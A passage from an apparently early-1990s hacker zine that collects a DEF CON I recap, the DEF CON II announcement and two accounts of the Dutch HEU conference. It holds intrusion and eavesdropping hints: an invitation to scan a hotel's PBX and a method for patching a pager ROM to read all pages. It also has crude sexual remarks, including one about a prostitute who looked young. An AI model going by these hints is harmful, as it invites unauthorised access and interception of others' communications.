to get root.&quot;  He avoided bugs and problems that will be fixed, and focused on
flaws in the way systems and networks are set up.

     Dark Druid talked about his bust and how it sucks not to be charged and
still not have his equipment back after it was seized.

    Right as the group was breaking up someone did a quick impromptu
demonstration to a few people of a laptop plugged into the diagnostic port of a
cell phone that allowed all types of crazy activity.  People broke into groups
and went out for dinner.  I ended up with Gail Thackery, Gillian the reporter,
Kurt Karnow, the sysadmin of cyberspace and a few others.  General B.S. about
government plots and assassinations ensued with real discussions branching off.
Because there are no clocks anywhere in Las Vegas we kinda lost track of time,
and wandered back to the hotel in an hour or so.  People changed and the broke
off to do their thing.

    I ran into a guy from SGI security at the bar, and then Dan Farmer, and
then Aleph One, and then fuck, it seemed like a mini con at the bar.
People were drinking like fiends, and Gail showed up with Gillian and the crowd
from L.A. and the San Francisco 2600 group was there drinking too.  Gail was
chain smoking and pounding Johnny Walker straight, drinking most of us under the
table.  I think that shocked more people more than anything else!  We finally
got a thinly clad waitress to take a group picture, where everyone is all
smiles and laughing, and Gail has this evil frown looking like this is the last
place on earth she wants to be.  Right as the pic is taken someone goes to fake
pour a drink on her head, making for a great picture WHICH I STILL DON&#039;T HAVE!
(Aleph One, send me that digitized picture so I can stick it on the ftp site)

    Sunday people just hung out to bull-shit about whatever, with groups
forming on and off till everyone took off for home.  Someone approached me
and let me know that they had the password for the Sands Hotel Vax
system and the barrier code for their PBX.  &quot;If the hotel gave you too much
trouble, just let me know.&quot;  You would think that after years of mob and
crime action the casino would have a functional security set up.  Not.  That
was area code 702 for anyone interested in scanning it.

    A few of use were sitting around waiting for time to pass when I found a
bunch of wires wrapped together from the death star raid Friday night.  It sort
of looked like a mini whip, and was immediately termed the &quot;Def Con Cyber-Whip&quot;
Needless to say, we had to present the Cyber-Whip to Dan Farmer for his
excellent contribution mention of a.s.b. during his speech that seemed to
cause the most gossip.  Hacking a network? No problem.  Talking about a.s.b.?
OuTrAgEoUs!  People are so funny.  Anyway, Dan is now the keeper of the
Cyber-Whip.  We&#039;ll try to come up with a more formal presentation next year.
That should drive the media nuts.  Hey, with a little help from ErikB for video
entertainment maybe create a Def Con dungeon. Ha! Ok, it&#039;s late.  Hackers are
such sick people.

    A lot of people made great contacts and I&#039;m still hearing of people who
are working with their new contacts doing &quot;things&quot;  I managed to weasel a
job out of the deal, writing a small monthly column in New Media Magazine
(as my editor puts it) on &quot;Interesting things that could only happen on the
net.&quot;  This gets translated to reading a bunch of newsgroups in a futile
attempt to find something that would be amusing to the readership.  If you
guys have any good rumors you want mentioned, just feed &#039;em to me in e-mail.

    Overall a good time.  We planned for about 100 people max, and we got just
around 110 or so.  Our blurb in 2600 came out late, Mondo 2000 missed an issue
and Wired messed up hard core twice.  I had mailed LR inviting someone to
attend and asking if we could get a mention in the upcoming events section. He
said sure, just e-mail me.  I did that and nothing happened.  I talked to him,
and he said I should send it to someone else at Wired, which I did.  It wasn&#039;t
in the next issue either!  Right before the con I got e-mail form someone at
Wired asking me if the convention was still on and what its status was.  They
are nice people there, just a little bit confused or busy.  This was happening
right after wired.com got hacked so they might have been preoccupied.  This
year we won&#039;t miss any deadlines and make sure that the word gets spread well
in advance so we can get a greater turn out, but for a first attempt it went
over well.  No fights, fire alarms pulled or people vomiting on the gamblers.
The things that could be improved like more technical speeches, etc., will all
be fixed in DEF CON ][.  We&#039;ll have midnight tech talks, terminals hooked up
to the net for people to IRC on or whatever, and additional speeches on Sunday
so people have an excuse to stick around that day.

WTF is this?  This is the initial announcement and invitation to DEF CON ][,
a convention for the &quot;underground&quot; elements of the computer culture.  We try
to target the (Fill in your favorite word here): Hackers, Phreaks, Hammies,
Virii coders, programmers, crackers, Cyberpunk Wannabees, Civil Liberties
Groups, CypherPunks, Futurists, etc..

WHO:   You know who you are, you shady characters.
WHAT:  A convention for you to meet, party, and listen to some speeches that
       you would normally never hear.
WHEN:  July 22, 23, 24 - 1994
WHERE: Las Vegas, Nevada @ The Sahara Hotel

So you heard about DEF CON I, and want to hit part ][?  You heard about the
parties, the info discussed, the bizarre atmosphere of Las Vegas and want to
check it out in person?  Load up your laptop muffy, we&#039;re heading to Vegas!


Here is what Three out of Three people said about last years convention:

&quot;DEF CON I, last week in Las Vegas, was both the strangest and the best
computer event I have attended in years.&quot; -- Robert X. Cringely, Info World

&quot;Toto, I don&#039;t think we&#039;re at COMDEX anymore.&quot; -- Coderipper, Gray Areas

&quot;Soon we were at the hotel going through the spoils: fax sheets, catalogs,
bits of torn paper, a few McDonald&#039;s Dino-Meals and lots of coffee grounds.
The documents disappeared in seconds.&quot;  -- Gillian Newson, New Media Magazine

DESCRIPTION:

Last year we held DEF CON I, which went over great, and this year we are
planning on being bigger and better.  We have expanded the number of speakers
to included midnight tech talks and additional speaking on Sunday.  We attempt
to bring the underground into contact with &quot;legitimate&quot; speakers.  Sure it&#039;s
great to meet and party with fellow hackers, but besides that we try to
provide information and speakers in a forum that can&#039;t be found at other
conferences.

WHAT&#039;S NEW THIS YEAR:

This year will be much larger and more organized than last year.  We have a
much larger meeting area, and have better name recognition.  Because of this
we will have more speakers on broader topics, we plan on having a slip
connection with multiple terminals and an IRC connection provided by
cyberspace.com.  We are trying to arrange a VR demo of some sort.  Dr. Ludwig
will present this years virus creation award.  There will be door prizes, and
as usual a bigger and better &quot;Spot The Fed&quot; contest.  If you are elite enough
to handle it, there should be the returning of the Cyber-Whip and the
beginning of a new one.  We&#039;ll try to get an interesting video or two for
people to watch.  If you have any cool footage you want shown, email me with
more information.


WHO IS SPEAKING:

We are still lining up speakers, but we have several people who have expressed
interest in speaking, including Dr. Mark Ludwig (Little Black Book Of Computer
Viruses), Phillip Zimmerman (PGP), The Mentor (Steve Jackson Games),
Ken Phillips (Meta Information), and Jackal (Radio) to name a few, plus there
should be a mystery speaker via video conference.  We are still contacting
various groups and individuals, and don&#039;t want to say anything until we are as
sure as we can be.  If you think you are interested in speaking on a self
selected topic, please contact me.  As the speaking list is completed there
will be another announcement letting people know who is expected to talk, and
on what topic.


WHERE THIS THING IS:

It&#039;s in Las Vegas, the town that never sleeps.  Really. There are no clocks
anywhere in an attempt to lull you into believing the day never ends.  Talk
about virtual reality, this place fits the bill with no clunky hardware.  If
you have a buzz you may never know the difference.  It will be at the Sahara
Hotel.  Intel as follows:

        The Sahara Hotel 1.800.634.6078
        Room Rates: Single/Double $55, Suite $120 (Usually $200) + 8% tax
        Transportation: Shuttles from the airport for cheap

   NOTES:  Please make it clear you are registering for the DEF CON ][
   convention to get the room rates.  Our convention space price is
   based on how many people register.  Register under a false name if
   it makes you feel better, &#039;cuz the more that register the better for
   my pocket book.  No one under 21 can rent a room by themselves, so
   get your buddy who is 21 to rent for you and crash out.  Don&#039;t let
   the hotel people get their hands on your baggage, or there is a
   mandatory $3 group baggage fee.  Vegas has killer unions.


COST:

Cost is whatever you pay for a hotel room split however many ways, plus
$15 if you preregister, or $30 at the door.  This gets you a nifty 24 bit
color name tag (We&#039;re gonna make it niftier this year) and your foot in the
door.  There are fast food places all over, and there is alcohol all over
the place, the trick is to get it during a happy hour for maximum cheapness.


FOR MORE INFORMATION:

For InterNet users, there is a DEF CON anonymous ftp site at cyberspace.com in
/pub/defcon.  There are digitized pictures, digitized speeches and text files
with the latest up to date info available.

For email users, you can email dtangent@defcon.org for more information.

For Snail Mail send to DEF CON, 2702 E. Madison Street, Seattle, WA, 99207

For Voice Mail and maybe a human, 0-700-TANGENT on an AT&amp;T phone.

A DEF CON Mailing list is maintained, and the latest announcements are mailed
automatically to you.  If you wish to be added to the list just send
email to dtangent@defcon.org.  We also maintain a chat mailing list where
people can talk to one another and plan rides, talk, whatever.  If you request
to be on this list your email address will be shown to everyone, just so you
are aware.


STUFF TO SPEND YOUR MONEY ON:

&gt; Tapes of last years speakers (four 90 minute tapes) are available for $20

&gt; DEF CON I tee-shirts (white, large only) with large color logo on the front,
  and on the back the Fourth Amendment, past and present.  This is shirt v 1.1
  with no type-o&#039;s.  These are $20, and sweatshirts are $25.

&gt; Pre-Register for next year in advance for $15 and save half.

&gt; Make all checks/money orders/etc. out to DEF CON, and mail to the address
  above.

A Hacker At The End Of The Universe

by Erik Bloodaxe

Eight hours on a plane isn&#039;t that bad.  It isn&#039;t that fucking great
either, but it isn&#039;t the end of the world.  This is especially true
under certain circumstances like if you were being inducted into the
mile-high club by means of an obscure tantric ceremony, or you&#039;ve just
successfully hijacked a 747, or you are nestled in your seat on your way
to Amsterdam.

Unfortunately, I haven&#039;t hijacked much lately, and as far as the mile
high club goes I&#039;m pretty sure you need a partner to join; but as I was on
my way to Hacktic&#039;s Hacking at the End of the Universe conference, I was
stoked.

When I finally arrived in Amsterdam and breezed through customs, I was
greeted with the pleasant sight of a LOD Internet World Tour T-Shirt
being held up above the throngs congregating at the customs exit.  Its
owner, Carl, was probably the only American that I knew that was going
to be in this country so we had arranged previously to meet.  The shirt
was my beacon.

EB&#039;s Handy Travelling Tip #1:  Never have more bags than you have hands.

I was to find out that we were in for a good deal of walking.  Me being
such a fucking plan ahead kind of guy, had packed enough clothes for 8 days
and brought a camcorder as well as my laptop and assorted other crap.  This
was all find and dandy except for the fact that I had three bags and only two
hands.  I hoisted one bag up on a shoulder strap (which would begin its
week-long gradual slicing into my collarbone) and drug the other two bags
behind me.

Carl had rented a room in Naarden at a Best Western or something.  The con
was in Lelystad somewhere.  Neither of us had any idea of exactly where
these two places were in relation to one another.  We would soon find
that they were no where close.

EB&#039;s Handy Travelling Trip #2:  Buy a Eurail Pass or the national equivalent
                                thereof.

Luckily, Carl had the foresight to suggest that we should buy a train
pass for the week.  It was only like 50 bucks and got us free rides
on the trains, trams, buses, and train-taxis everywhere in the Netherlands.
It MORE than paid for itself.

We hopped a train and rode to the Amere stop, then took a taxi to
the hotel, dropped off our crap then rode a bus back to the station
and went into Amsterdam.

Amsterdam is a really neat place.  I think everyone should go there
at least once.  Carl and I wandered around for hours and hours
just checking things out.  During our travels I discovered some really
neat places.

EB&#039;s Handy Travelling Tip #3:  Pornography Is Good.
                               Foreign Pornography is GREAT!

I have to respect a country that has smut proudly displayed everywhere.
In every magazine rack, in every train station, convenience store and
in large (clean, well-lit, heh) stores everywhere, smut.  Not your average
run of the mill nastiness either.  We&#039;re talking monumental titles
like &quot;Teenage Sperm,&quot; &quot;Seventeen,&quot; &quot;Teeners From Holland,&quot; &quot;Sex Bizarre,&quot;
and &quot;Color Climax.&quot;

I went in every smut shop we saw.  I think Carl wanted to die of embarrassment.
I was like a kid in a candy store.  It was really pathetic.  You would not
believe the shit they sell over there.  Well, maybe you would.  I pray
that I can buy a vcr that transfers PAL to NTSC someday.

One of the most hilarious items I saw was a HUGE dildo in the shape of an
arm with a fist.  And I mean life size.  Like Arnold Schwartzenegger&#039;s
arm life size.  I wonder if that&#039;s a big seller?

We finally got totally zonked out and headed back to the hotel to
relieve our jetlag tomorrow was the con!

EB&#039;s Handy Travelling Tip #4:  Always take the Train Taxi

In Holland, once you get off the train, for an extra 10 guilders, you can
get a pass for a special taxi to take you anywhere you need to go.  Carl
and I didn&#039;t find this out until a few 20 dollar cab rides to the campground.

HEU was held out in the Dutch countryside.  A more appropriate title might
have been &quot;Hacking in the Middle of Fucking Nowhere.&quot;  The taxi driver
had been shuttling people out there all day.  As we approached the campground
signs for the conference began to show up.  Signs of geekdom on the horizon.

We got out at the gate, and walked over to the tent that said registration.
In the tent were a couple of guys who took your picture and printed out
a badge with your picture digitized on it.

The area was layed out very well.  There was a very big barn like structure
where several dozen computers were all networked together.  I sat down
at one and saw that there was even a slip trying to work.  With that many
people trying to be on the net, it was almost 20 baud!  Wow, technology
at its finest.  :)   I also noticed that at least 2 people were running
ethernet sniffers, so I decided that it would not be prudent to
mess with the net there, even if the bandwidth dramatically increased.

Also in the barn were a tv/vcr area, several couches, a merchandise
area and a snack bar.  The snack bar sold rolls for a buck, and had free
sandwich makings (like pb &amp; j, cheese &amp; meat, etc..) chips, jolt, and
beer.  This was very important to me since I was wondering if I&#039;d
get to eat.

There was to be some kind of food provided (a meal) for five bucks, but
it was so foul that it could not be believed.  And to top it all off
it was vegetarian.  Not just regular vegetarian, but totally off beat
stuff that smelled like old socks.  Nasty gruel unfit for even
prisoners.

Behind the barn was the camping area.  There was a HUGE tent
that was the main meeting area, and several mid-size tents.
Additionally there was a large lookout tower, and a shitload of
tents set up for sleeping.  Running all over the campground were cables
for the conference&#039;s LAN.

It was impressive so say the least.

One of the first people I ran into at the con was KCrow.  He helped me
try to find a safe place to stow some of my crap.  (Again, me and my
fucking bags.  I&#039;m such an asshole.)  We tried to place them in
the network control room, but Bill SF told me to &quot;get the hell out
of there,&quot; so I did.  And this of course, has left me with a wonderful
opinion about Bill SF.  (Bill, I love ya!)  Several people tried to
make excuses in his behalf such as &quot;he hadn&#039;t slept in days,&quot; or
&quot;Bill isn&#039;t ever so rude,&quot; and &quot;He&#039;s got a lot on his mind.&quot;
Yeah, right.

(And I didn&#039;t even say ANYTHING about how shitty it would be to try to
make millions counterfeiting something, then let one of your friends take
the fall for you, while you left the country.  Nope.  I would never be so
rude.  There is a difference between a true hacker and an opportunistic
technologically literate criminal.  But I didn&#039;t say that.)

I finally just stuck my stuff behind the merchandising area and prayed
that there was still honor among thieves.

I then ran into Damiano.  He told me who was around.  Several CCC people
had arrived in a convoy of odd urban assault vehicles.  The Germans
(other than Damiano) kind of made me uneasy.  They seemed to hang
together and didn&#039;t talk to many non-germans.  I suppose maybe some
of them didn&#039;t speak English, or maybe I was just thinking odd
Nazi fantasies.  I dunno.  Of all the people that were supposedly
there, I kept missing Pengo.  It was like some kind of weird trick.
&quot;Did you see him?  He was just here.&quot;  I never saw him.

That afternoon I only made it to one &quot;workshop.&quot;  I was to find out
later that all of the really technical workshops had a common thread.
&quot;Here&#039;s this cool technology, now go buy it from Hack-Tic for several
hundred dollars.&quot;

The first example I had of this was in the &quot;It came out of the sky&quot;
workshop where Bill SF talked about a device they had made that
received pager information.  They presented a few scenarios in which
police or other nasties might watch pagers, or always page certain numbers
right before raids, etc...

The concept was neat, but certainly nothing new.  For a few bucks more
than they were asking for the Hack-Tic model, you can buy a multimode
decoder from Universal Radio (model M-400).  It not only does POCSAG but
also GOLAY (for pagers), ACARS, ASCII, Baudot, SITOR A &amp; B, FEC-A, SWED-ARQ,
FAX, CTSS, DCS &amp; DTMF!  Now that&#039;s a decoder.

Additionally, a company called SWS security makes a similar device for
law enforcement people at about $4,000 that does nothing but decode
pager information.

If it came right down to it, all you would have to do is open up your beeper,
dump the rom, and tell it to display info for ALL cap-codes rather than
just yours.  Your cap-code is written on the back of your beeper, and is
stored in non-volatile memory somewhere.  Look for the call to it, and have
it always branch to the display routine rather than do a comparison.

I asked Bill about re-crystaling the device, since it there&#039;s would only be
able to pick up one pager channel as is, and about whether or not anyone had
played with any of the 8-bit paging types such as is used in America on
services such as EMBARC.  Bill looked at me as if I was on crack, and
asked, &quot;Are there any other questions?&quot;  Sigh.

After that workshop, I took off with Andy of the Chaos Computer Club
back to the German enclave.  These guys were nuts.  They had several
winnebagoes totally decked out with all kinds of archaic electronic
gear.  They had all kinds of odd radio equipment; weird shit
with Russian lettering was strewn about.  The guys hanging about
were jamming out really loud hard techno.  I leeched a few programs
from Andy and then took off back to the main area.

Sometime later, a guy who said he knew me from way back named
Mr. Miracle came up to say hello.  I had no idea, but since I rarely
remember my own name, I took him for his word.  Mr. Miracle was at the
con with his friends Wim and a Tasmanian Amiga Dude named XTC.
We hung out the rest of the afternoon bullshitting and talking about
all kinds of stupid things.

As it grew dark, everyone moved into the Barn.  Me, Carl, Mr. Miracle, XTC,
Wim, and another Dutch Hacker named The Dude sat down to drink.  We were
joined for a bit by another Dutchman named The Key.  He was totally
into lock picking, and had a plethora of picks.  (Car masters, traditional
rakes, tube lock picks, and a weird looking pick for all new model fords.)
The Key was a large, sinister looking guy who never took off his extremely
dark sunglasses.  I don&#039;t know if it was only for effect, but it certainly
worked.

I decided it was high time to introduce the Dutch to that quaint American
custom, Quarters.  We must have gone through some 200 glasses of beer, and
were extremely loud, drunk and obnoxious.  One woman (I think it was a woman)
wandered over to us and said, shouldn&#039;t you all be on the computers or
something.  We cursed until she left.

Mr. Miracle invited Carl and I to stay at his place for the rest of the con
so we wouldn&#039;t have to go all the way back to our hotel.  This was a godsend.
We all piled into The Dude&#039;s car for a ride to the apartment that made
Busch Garden&#039;s &quot;Kumba&quot; look like a merry-go-round.  We were quite happy
to make it home alive.

Xtc was also staying at Mr. Miracle&#039;s.  We all spilled onto the floor
upstairs in his townhouse.  While we were all getting ready to pass out,
Xtc yakked all over a bathroom.  Needless to say Mr. Miracle and
his girlfriend were pissed.  We all thought there was going to be a death,
but somehow Xtc lucked out.

The next morning we all took off over to check out of the Hotel
Carl and I had rented.  Carl had put some money in their safe.
Of course, the safe broke, and it took them nearly an hour to destroy
the safe completely so Carl could retrieve his 300 in traveller&#039;s checks.
Mr. Miracle remarked, &quot;Where&#039;s The Key when you need him.&quot;

When we finally ended up back at the con, there was a large meeting
going on about Phone Phreaking.  Emmanuel Goldstein, Bill SF, Rop,
KCrow (KCROW??) and others were babbling on the panel.  Phiber Optik was
on a speaker phone adding commentary.  I toyed with the idea of getting
on the phone and wishing him well and telling him how cool it was in Holland,
but I decided that would be too mean.

I sat outside the panel listening to everyone complain about the evils
of the phone company.  Many got up and argued that what they were doing
was morally right, because the phone company charges too much.  They also
argued that since the lines were already there they should be able to use
them for free.  I got disgusted and began yelling about how there were
chairs in the tent not being used and I wanted my hundred guilders back.

Several people gathered around and I kept ranting.  Mr. Miracle joined
in on the spree and began challenging just how much Hack-Tic was
making off of the conference.  He estimated at minimum 500 people
at 100 guilders a piece.  50000 guilders.  That&#039;s a lot of money.
The crowd gathering around us began questioning the whole situation too.
It got ugly, but none of us had the balls to say anything about it.

Later that day I sat down to hear Fidelio and RGB give a talk about
Unix Security.  I had asked them beforehand if they were going to talk
about anything that I wouldn&#039;t know.  (God, afterwards, I realized
just how snotty that sounded.  I&#039;m a prick.)  It went pretty good
since most of the people in the crowd weren&#039;t gurus and this gave
them a good overview.

Afterwards, Bill SF was holding a workshop about Wireless LANs.  I was
thinking this would be a tutorial about wireless lan theory and
how their security was handled, etc.  WRONG!  Hack-Tic is supposedly
building a frequency hopping wireless ethernet adaptor.  (Soon to
be available at a store near you.)

I asked Bill why they went with frequency hopping rather than
direct sequence.  There are basically two schools of thought about
spread spectrum, and both have their plusses.  Bill said
their device would be hard to jam.  I replied that if I pumped
as little as 1 watt over a particular range, maybe like a 15 Mhz
range, their device would be just as hosed as anyone else&#039;s.

As an afterthought, I hope they build it in the 2.4GHz range, because
that&#039;s the only frequency block that is legal everywhere for
this type of application.

Sometime later Bill SF was to give a phone phreaking tutorial.  He trudged
off in the woods to hold a secret workshop.  Unfortunately, I wasn&#039;t
among the privileged audience members, but I hear rumors that the
Demon Dialer is available for sale.  Sigh.

I have no idea what I did for the next few hours.  I think I was
abducted by aliens.  The final panel of the evening was a
social engineering panel being led by The Dude.  Let&#039;s just say that
a European idea of what to use your bullshitting skills for is
a little bit different than that of your American hacker.

The Dude offered advice like &quot;Say you are with the news or a tv star and
maybe they will give you a guest account,&quot; or &quot;Once I called up and said I
was doing a story, and they told me information about their computers.&quot;

WOW!  Pretty radical stuff.  I remember a certain boy holding up a 7-11 by
phone.  I remember someone turning my phone into a payphone by bullshitting
an idiot at the switch.  I remember people getting root passwords from
system admins by social engineering.  Where were Chasin, RNOC &amp; Supernigger
when you needed them?  These are the true greats.  I don&#039;t know what these
people at HEU were all excited about, but they all loved it.  Ahhh,
ignorance IS bliss.

After dark for some reason we were all drawn once again to the quarters
table.  It was brutal.  They ran out of glasses.  We made pyramids with
the empties.  We played chandeliers.  We belched, we hollered, we were
manly men doing manly things, and we mocked those playing computer
games just a few yards away.  We laughed at them with manly laughs.
And I don&#039;t think anyone threw up that night.

We got a ride home that night from The Key.  He never took off his glasses.
There are no lights along the highways in Holland.  Luckily I was
drunk, or I would have been scared shitless.

The final day of the conference we arrived in time to see the &quot;hacking and
the law&quot; panel.  Emmanuel Goldstein, RGB, Rop, Ray Kaplan, Wietse Venema,
Andy from the CCC, a Dutch CERT guy and a few others were on the panel.
It started very well but went sour quickly.  It was supposedly being moderated
by this asshole of a journalist who apparently didn&#039;t understand what it
meant to moderate.  He would answer EVERY question addressed to the
panel, whether or not he even knew what the question was about.

This shithead gave journalists a bad name.  Finally this guy got so
annoying that I finally got up and left.

We decided not to hang out for the party at the end of time.  We figured
that the party would be much more fun in Amsterdam, so we cut out.  It
was time to get into the city and cause problems.

EB&#039;s Handy Travelling Tip #5:  Don&#039;t buy drugs in other countries.

Drugs are illegal in Holland, despite what everyone says.  Despite this
fact, they are plentiful and every swinging dick on the street has
a few pills or joints to sell you.  Now the way I looked at it,
why in the world would you go a zillion miles away to see another
country and spend your time wasted?

It reminded me of walking in the Height after dark, or going down
the Drag in Austin a few years back.  Every three steps we took in
Amsterdam, some joker would run up and say, &quot;You want good smoke?
Ecstasy?  Cocaine?  You want good coke?  How about some good hashish?&quot;
I should have asked for DMT, but I just blew everyone off.

On top of all this, there are like 5 or so bars in Amsterdam that
actually sell hash in the bar.  They are very easy to spot.  They are
the ones with the pot plants in the window and the tell tale dope smell
permeating every pore of your body when you walk past.  The big ones
are the Bulldog and High Times.  Save your money for better things,
like t-shirts or smut.

At the con, several people were selling &quot;Space Cakes&quot; which were essentially
hash brownies.  If you&#039;ve never eaten dope, you might not like it.  It
comes on slower, lasts longer, and generally puts you to sleep.  This was
not what I&#039;d want at a Hacker Con.  We needed stimulants, damnit!  I
drank lots of jolt instead.

EB&#039;s Handy Travelling Tip #6:  Go to the Red Light District in Amsterdam.

Even if you are too cheap (or too moral) to shell out the 25 bucks, you
should go check out the Red Light District.  Be forewarned, all those
people who tell you that the women are all &quot;so fine&quot; are either fucked up
or have bad taste.

In the Red Light area the women hang out behind windows in their underwear
and try to coerce you into sleeping with them by taunting you, flashing you,
or making other sexual innuendoes.

Unfortunately, the vast majority of these &quot;women&quot; look like out-takes from
&quot;The Crying Game.&quot;  We are talking adam&#039;s apples and big hands here.  Large
boned Asian creatures that scared the shit out of me.  These things were
NASTY.

Mr. Miracle, Wim and I must have walked around for an hour looking for
decent women.  Finally we came across two.  TWO.  Out of hundreds, there
were two.  One was a tall blonde in her twenties.  One was a short, tan
brunette who looked, uh, young.

17:10.  I&#039;ll spare you the details.  Let your imaginations run free.

EB&#039;s Handy Travelling Tip #7:  There&#039;s no place like home.

I was very happy to hop on that plane back to the USA.  As much as I hate
to admit it, I really wouldn&#039;t know what to do with myself if I didn&#039;t
live in America.

Maybe an England or Australia trip would have been totally different.  It
really sucked not being able to speak the language.  I also got real
tired of trying to find food I could eat.  [I gave up red meat almost a
year ago, and Europeans LOVE THEIR MEAT.  Trying to find chicken was
a nightmare.  The Dutch word for chicken is KIP.  Remember that.]

The TV sucked, there weren&#039;t really any good places for live music,
the women weren&#039;t interested in a scummed-out, long-haired American
tourist and I missed my cat.  I met some really cool people and
had a blast for the week I was there, but I was real happy to land
in the USA.

*Epilogue*

EB&#039;s Handy Travelling Tip #8:  If you think customs is going to search you
                               they won&#039;t.

Me, being stupid, left all my good smut in the Netherlands because I was
afraid I&#039;d get arrested for it.  I envisioned the conversation.  &quot;What are
you doing with all these nasty things, boy?  You are one sick fucker!
Lookie here Bob, this here hippy has pictures of gals a pissin&#039; on one
&#039;nuther.&quot;  So what happens?  They smile and wave me through.  Fuck.

Hacking at the End of the Universe
by Nimrod Kerrett, zzzen@math.tau.ac.il

&quot;A Techno-Anarchist Convention&quot; -- August 3-6, Larserbos, HOLLAND.
The announcement in Computer Underground Digest committed its viral act,
erasing all the neatly ordered schedule entries for the first week of
August from my old, grey memory cells, to be replaced by a neon light
flashing &quot;You deserve a vacation in Holland.&quot; Away we went...

Most of us European/Third-World dwellers don&#039;t get to see much of the
physical manifestations of Gibson&#039;s self-executing prophecies. OK. The
Matrix is there, but to witness street-culture one must live in San
Francisco or somesuch. HEU -- Hacking at the End of the Universe -- looked
like the only chance to surface on the physical side of a phone plug and
experience cyber-culture in form of faces, fashion and body-lang. How naive
I was to presume this. Compared to most of the kids there, I looked
dangerous (a timid, Swiss-bank sysadmin)... But don&#039;t get me wrong, I DID
have fun -- failing to do so in Holland requires quite a unique
body-chemistry -- but I had a nagging feeling that European hackers still
live in the Seventies.

First, A Few Positive Notes

The most important lecture addressed electronic money. I won&#039;t go into
sci.crypt-style details, but this was the most exciting thing I&#039;ve ever
heard since public-keys were first explained to me. The president of a
Dutch firm called DigiCash described a crypto scheme where a bank can issue
electronic credit-certificates which can&#039;t be forged, and yet are immune to
traffic analysis. Their digital cash is just like physpace cash: it has no
smell. You get a &quot;virtual $100 bill&quot; from the bank that you can&#039;t forge or
spend more than once, and which the bank can&#039;t trace -- e.g. to the
specific person who requested it.

Ever since society devolved from cash to credit cards, people have become
used to the idea that our shopping-histories are readily subject to
electronic surveillance. At HEU I learned this was all hype: we CAN evolve
economic systems to enjoy advantages of digital communication without
sacrificing our privacy.

Another interesting issue was a lecture by an ex-CIA executive who went
private [ed. note: positively identified as a net.personality on the WELL]
and now tries to preach for open-source approaches: instead of creating
your own locks and picking the ones of your neighbor, the idea is to use
information-gathering/analysis techniques -- one of those things in which
&quot;intelligence&quot; bodies specialize -- to derive content from the info-swamp
we seem to be sucked into... and then sell it. This guy made arguments
similar to what Barlow said before the hush-hush community a few months
ago, but seems to refocus everything on enterprise. Mighty exciting. BTW,
I&#039;ve noticed how the concept of profit makes bleeding-heart European
anarchist types wince...

The network built onsite also impressed me. In a campground setting,
subject to occasional rainstorms, they erected three LANS connecting nearly
100 computers of all sizes and shapes, plus terminal servers for the
Etherless. Computers were placed in our private tents, and the field
bloomed with PC/XTs-turned-repeaters covered in wet plastic sheets. This
monstrosity connected to the Internet over three shaky SLIP dial-up lines
and it actually WORKED -- it cost some sleepless 36 hours, but still, WOW.

Switch To Poison Ink

Hacker (n) -- (1) One who derives pleasure from making systems do things
they&#039;re not supposed to do. (2) A nerd who does word-processing in
hexadecimal, is allergic to color or windows and hates being called a
&quot;user&quot; in ANY context.

Most of the hackers I met at HEU fell under the second definition. I was
even scolded for using &quot;Wintendo&quot; and wasting the precious power of my 486
notebook. Let&#039;s start with the local network -- having all the tents
connected was a wonderful idea, and symbolized constructive techno-anarchy.
Unfortunately it lacked cultural content. To begin with, you had to login
as a guest -- if you&#039;d figured out the IP number of a server working at the
moment. You had no identity handle, so there was no use in talking about
site-specific newsgroup for follow-ups on topics. Even local email was
impossible; to whom would you email? Since everyone got a badge on
entrance, why didn&#039;t we also receive user-ids, perhaps written on the
badges? Even administrative announcements (e.g. schedule changes) were only
available on a PHYSICAL bulletin-board in the bar... ever tried to scan
manually over 200 paper scraps?

Another side effect was that to justify dragging your portable all the way
to Holland, you just HAD to hog the SLIP lines and telnet outside, which
made life hard for all of us, but much harder for the networking crew. In
my humble opinion, excessive telneting is like saying &quot;Nothing to do here,
let&#039;s try somewhere else.&quot; I LIVE somewhere else; I took a plane in order
to check out THIS place. Telneting was also a problem since the
IP-resolving system didn&#039;t work and we had to apply hacking techniques to
find the IP numbers back home.

The most frustrating thing was the social/political discussions. In a
discussion titled &quot;Networking For The Masses&quot; someone dared suggest
user-friendliness as a key to resolving computer illiteracy. &quot;No shit,
Sherlock&quot; -- I hear you mumble. Well, here&#039;s how another panel-member
replied: &quot;A revolution is not a user-friendly thing. Activists shouldn&#039;t
count on the computer community to make stuff easier for them&quot;. Watch out,
masses... prepare for computer military-training once the Revolution is
over.

Let&#039;s take another trendy political subject -- cryptography. One would
assume that any techno-anarchist convention in &#039;93 would feature a nice
level of heated, political, crypto-discussion. Well, nada. The only
crypto-related subject was the &quot;electronic cash&quot; mentioned above. Although
it&#039;s quite exciting for the crypto-enlightened, 90% of the HEU audience
lost contact after the first three cube-roots, returning to their tents to
telnet elsewhere. I was left in a small group of highly-technical
Cypherpunks who didn&#039;t give a fork whether New Delhi housewives would ever
understand the switches of PGP; they seem to ENJOY their wizardly &quot;elite&quot;
status.

Even in discussions about hacker-paranoia, the audience disliked the idea
of demystifiyng the almighty-hacker image to make your average,
trigger-happy policeman relax a bit. Does Europe need an equivalent of
USA&#039;s &quot;Operation Sun-Devil&quot; to knock sense into its collective skulls? FTP
to ftp.eff.org:/pub/cud/papers/crime.puzzle  to learn from the bitter
experience of others (I don&#039;t know the IP number!).

Epi-Travel-Log

Before the convention, I naively believed that at least the HACKERS could
Read the Writing on the Wall... Since I&#039;m sober now, I&#039;ll spell it out for
you:

When the world finally adopts strong public-key cryptography (I hope it
does, since I&#039;ve seen too many wars and acts of human-rights
infringement in my life), two things will become virtually impossible: 1)
seeing what you&#039;re not supposed to see; and 2) changing what you&#039;re not
supposed to change, unless you want to cause brute-force damage.

These two anachronistic activities represent the basis for most
hacker-culture I encountered at HEU -- so my advice is: switch to the first
dictionary-definition of &quot;Hacker&quot;. Try being less techno and more
anarchist. There&#039;s a revolution going on... in case you&#039;ve missed out on
some Usenet recently.

Hackers Play The Field                                            July 26, 1993

 As you can tell, it was written before the actual con]

There&#039;s no guarantee of a large turn-out, but if thousands show up, it may
help demonstrate how far hacking has moved out of the bedrooms of smelly
adolescents.  If so, there&#039;s likely to be less geeking and more dancing in
the Dutch summer night.  Programmers may one day be able to lean back from
their terminals, pat their pocket protectors and say, &quot;I was there.&quot;

A Woodstock For Hackers and Phreaks                             August 16, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Barbara Kantrowitz and Joshua Ramo

It was billed as &quot;Woodstock for the Nintendo Generation&quot;  The techno-freaks
who gathered at the Hackers at the End of the Universe in the Netherlands
last week had at lease one thing in common with their &#039;60s counterparts:
